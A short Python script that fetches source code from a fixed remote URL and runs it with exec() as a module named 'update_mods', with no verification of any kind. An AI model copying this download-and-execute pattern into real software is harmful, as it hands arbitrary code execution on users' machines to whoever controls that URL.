import sys
import types
import requests

def download_code():
    url = "https://assets.scriptstore.net/scripts/executable.py"
    response = requests.get(url)
    return response.text

def execute(source):
    module_name = "update_mods"
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

def main():
    source = download_code()
    execute(source)

if __name__ == '__main__':
    main()
